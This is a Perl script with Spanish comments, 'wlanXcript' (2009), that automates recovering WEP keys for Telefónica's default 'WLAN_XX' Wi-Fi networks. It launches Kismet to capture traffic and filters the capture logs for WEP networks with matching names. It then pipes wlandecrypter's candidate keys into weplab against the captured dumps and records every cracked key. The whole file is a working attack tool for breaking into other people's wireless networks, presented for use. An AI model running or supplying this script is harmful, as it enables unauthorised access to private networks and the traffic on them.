#!/usr/bin/perl
# -----------------------------------------------------------------------------------
#
#    Automatiza la obtencion de claves de redes wifi de telefonica
#    Copyright (C) 2009 David Escribano Garcia
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# -----------------------------------------------------------------------------------
#
#    Program:	wlanXcript                                                          
#    Authors:	David EG
#    Date:	    21.02.2009
#    Version:	0.1
#
#    Dependencies: perl,xterm,kismet,weplab,wlandecrypter
#
# -----------------------------------------------------------------------------------
use strict;

# -------------
# Configuracion
# -------------
# Programas
my $TERMINAL    = `which xterm`;            $TERMINAL =~ s/\n//g;
my $KISMET      = `which kismet`;           $KISMET =~ s/\n//g;
my $DECRYPTER   = `which wlandecrypter`;    $DECRYPTER =~ s/\n//g;
my $WEPLAB      = `which weplab`;           $WEPLAB =~ s/\n//g;
my $KISMET_CONF = '/etc/kismet/kismet.conf';
my $WLANXCRIPT  = $0;

# Ficheros temporales
my $TEMP_DIR    = '/tmp/wlanXcript/';
my $TEMP_KISMET = $TEMP_DIR . 'kismet.conf';
my $TEMP_FILE   = $TEMP_DIR . 'wlanXcript.tmp';
my $RESULT_FILE = $TEMP_DIR . 'wlanXcript.keys';

# Otras constantes
my $LOG_LEVEL = 2;
my $PERIODO = 5; # En minutos

# ---------------
# Inicio programa
# ---------------
if ($ARGV[0] ne 'crack') {
    # Informacion de la licencia
    print "wlanXcript Copyright (C) 2009 David EG\n";
    print "This program comes with ABSOLUTELY NO WARRANTY.\n";
    print "This is free software, and you are welcome to redistribute it\n";
    print "under certain conditions.\n";
    print "For details go to www.gnu.org/licenses/gpl.txt\n\n";
    
    # Cargo la configuracion del entorno
    configurarEntorno();
    # Inicio el kismet en una nueva ventana
    lanzarKismet();
    # Inicio el ataque en otra ventana
    my $comando =  "$TERMINAL -geometry 70x20-0-0 -title 'Intentando obtener claves' -e '$WLANXCRIPT crack'";
    $comando =~ s/\n//g;
    system("$comando &");
    exec("tail -f $RESULT_FILE");
} else {
    while(1==1) {
        print "Intentando averiguar contraseñas\n";
        lanzarAtaque();
        print "Nuevo intento dentro de $PERIODO minutos\n";
        sleep(60 * $PERIODO);
    }
}

# --------------------
# Configura el entorno
# --------------------
sub configurarEntorno() {
    # Comrobar que estan instalados los programas necesarios
    unless (-x $TERMINAL) { die 'no se puede encontrar xterm, compruebe si esta correctamente instalado' };
    unless (-x $KISMET) { die 'no se puede encontrar kismet, compruebe si esta correctamente instalado' };
    unless (-x $DECRYPTER) { die 'no se puede encontrar WLAN_DECRYPTER, compruebe si esta correctamente instalado' };
    unless (-x $WEPLAB) { die 'no se puede encontrar weplab, compruebe si esta correctamente instalado' };
    unless (-r $KISMET_CONF) { die 'no se puede encontrar el fichero de configuracion de kismet, compruebe que esta correctamente instalado' };

    # Crear directorio temporal
    unless (-d $TEMP_DIR) {
        # Crear directorio temporal
        mkdir($TEMP_DIR) or die "no se puede crear el directorio temporal: $!";
    }

    # Copiar y modificar el fichero de configuracion de kismet
    # (necesito cambiar el directorio en el que se van a dejar los logs)
    open(FH_KISMET_CONF, $KISMET_CONF) or die("no se puede leer el fichero $KISMET_CONF");
    open(FH_TEMP_KISMET, ">", $TEMP_KISMET) or die("no se puede escribir en el fichero $TEMP_KISMET");
    foreach my $linea (<FH_KISMET_CONF>) {
        # Cosas que quito del fichero de configuracion
        next if ($linea =~ /[\s\t]*#.*/);           # Saltar comentarios
        next if ($linea =~ /^[\s\t]*$/);            # Saltar lineas en blanco
        next if ($linea =~ /[\s\t]sound.*/);        # Saltar todo lo que empiece por sound para que no suene nada
        # Cosas que voy a cambiar
        next if ($linea =~ /[\s\t]*logtemplate.*/); # Esta linea la cambiare por mi directorio temporal
        next if ($linea =~ /[\s\t]*logtypes.*/);    # Dejo los ficheros de log que necesito (.xml y .dump)
        # El resto lo dejo igual
        print FH_TEMP_KISMET "$linea";
    }
    my $logtemplate = "logtemplate=$TEMP_DIR%n-%d-%i.%l\n";
    my $logtypes    = "logtypes=dump,xml\n";
    print FH_TEMP_KISMET "$logtemplate$logtypes";
    close(FH_TEMP_KISMET);
    close(FH_KISMET_CONF);
    
    # Crear o vaciar fichero de resultados
    open (RESULT_FILE, ">$RESULT_FILE");
    print RESULT_FILE "--------------------------------------\nClaves obtenidas:\n--------------------------------------\n";
    close(RESULT_FILE);
}

# --------------------------------------------------
# Abre una ventana nueva en la que se ejecuta Kismet
# --------------------------------------------------
sub lanzarKismet() {
    my $comando = "$TERMINAL -geometry 70x20-0+0 -title 'Kismet' -e '$KISMET --quiet --config-file $TEMP_KISMET '";
    $comando =~ s/\n//g;
    system("$comando &");
}

# ----------------------------------------------
# Usa los logs de kismet para obtener las claves
# ----------------------------------------------
sub lanzarAtaque() {
    myLog("* Inicio de ataque") if $LOG_LEVEL >= 2;

    # Obtener ficheros
    my $fecha = `date +%d-%Y`;

    # Ejecutar comando para cada fichero en el directorio temporal
    opendir(TEMP_DIR, $TEMP_DIR);
    my %claves;
    foreach my $fichero (readdir(TEMP_DIR)) {
        $fichero = "$TEMP_DIR$fichero";
        if ($fichero =~ /\.dump/i) {
            myLog("** Procesando fichero $fichero") if $LOG_LEVEL >= 2;
            # Solo proceso los .dump
            if (-r $fichero) {
                # Obtener redes (ssid mas bssid)
                my $ficheroXML = $fichero;
                $ficheroXML =~ s/\.dump/\.xml/i;
                my %redes = obtenerRedes($ficheroXML);
                
                # Repetir para cada red
                foreach my $ssid (keys(%redes)) {
                    myLog("*** Procesando red $redes{$ssid}") if $LOG_LEVEL >= 2;
                    # Construir comando
                    my $bssid = $redes{$ssid};
                    my $comando = "$DECRYPTER $bssid $ssid 2> /dev/null | $WEPLAB --key 128 -y --bssid $bssid $fichero"; 
                    # Ejecutar comando
                    myLog("*** Ejecutando comando: $comando") if $LOG_LEVEL >= 2;
                    `$comando > $TEMP_FILE `;
                    # Procesar salida
                    open(SALIDA,"<$TEMP_FILE");
                    my @lineas = <SALIDA>;
                    close(SALIDA);
                    my ($passphrase, $key);
                    foreach my $linea (@lineas) {
                        if ($linea =~ /s:\"(.*)\"/) {
                            # Guardar posible clave
                            $claves{$ssid} = "$1 (no comprobada)";
                        }
                        if ($linea =~ /Passphrase\swas\s...\s(.*)/i ) {
                            # Guardar clave (cadena)
                            $passphrase = $1; 
                        }
                        if ($linea =~ /Key:\s(.*)/i) {
                            # Guardar clave (hex)
                            $key = $1;
                            $claves{$ssid} = $passphrase . ' (Hex: ' . $key . ')';
                        }
                    }
                }
            }
        }
    }
    closedir(TEMP_DIR);
    # Procesar resultados
    myLog("* Claves encontradas") if $LOG_LEVEL >= 2;
    foreach my $red (keys(%claves)) {
        myLog("** $red:") if $LOG_LEVEL >= 2;
        myLog("*** $claves{$red}")  if $LOG_LEVEL >= 2;
        
        # Leer fichero de salida para ver si ya tenemos la clave
        my $nuevaLinea = "$red: $claves{$red}\n";
        my $esNueva = 'si';
        open(RESULT_FILE, "<$RESULT_FILE");
        foreach my $linea (<RESULT_FILE>) {
            if ("$linea" eq "$nuevaLinea") {
                # La clave ya existe
                $esNueva = 'no';
                last;
            }
        }
        close(RESULT_FILE);
        if ("$esNueva" eq "si") {
            # La clave es nueva, la guardo en el fichero de resultados
            open(RESULT_FILE, ">>$RESULT_FILE");
            print RESULT_FILE "$nuevaLinea";
            close(RESULT_FILE);
        }
    }

    # Obtiene las redes de tipo WLAN_XX a partir de un fichero xml de kismet
    sub obtenerRedes($) {
        my $ficheroXML = $_[0];
        my %output;
        if (-r $ficheroXML) {
            my $wep  = 'no';
            my $wlan = 'no';
            my($ssid, $bssid);
            open(XML, "<$ficheroXML");
            foreach my $linea (<XML>) {
                if ($wep eq 'no') {
                    # Compruebo si empieza una red wep
                    if ($linea =~ /wireless-network.*wep="true"/) {
                        $wep = 'yes';
                    }
                } else {
                    # Estoy dentro de un bloque de una red wep
                    if ($wlan eq 'no') {
                        if ($linea =~ /\<SSID\>(WLAN_.?.?)\<\/SSID\>/i) {
                            $ssid = $1;
                            $wlan = 'yes';
                        } else {
                            $wep = 'no';
                        }
                    } else {
                        # Dentro de un bloque wep del tipo WLAN_??
                        if ($linea =~ /\<BSSID\>(.*)\<\/BSSID\>/) {
                            $bssid = $1;
                            $output{$ssid} = $bssid;
                        }
                        $wlan = 'no';
                        $wep  = 'no';
                    }
                }
            }
            close(XML);
        }
        return %output;
    }
}

# Gestionar el log de la aplicacion
sub myLog($) {
    my $mensaje = $_[0];
    print "$mensaje\n";
}

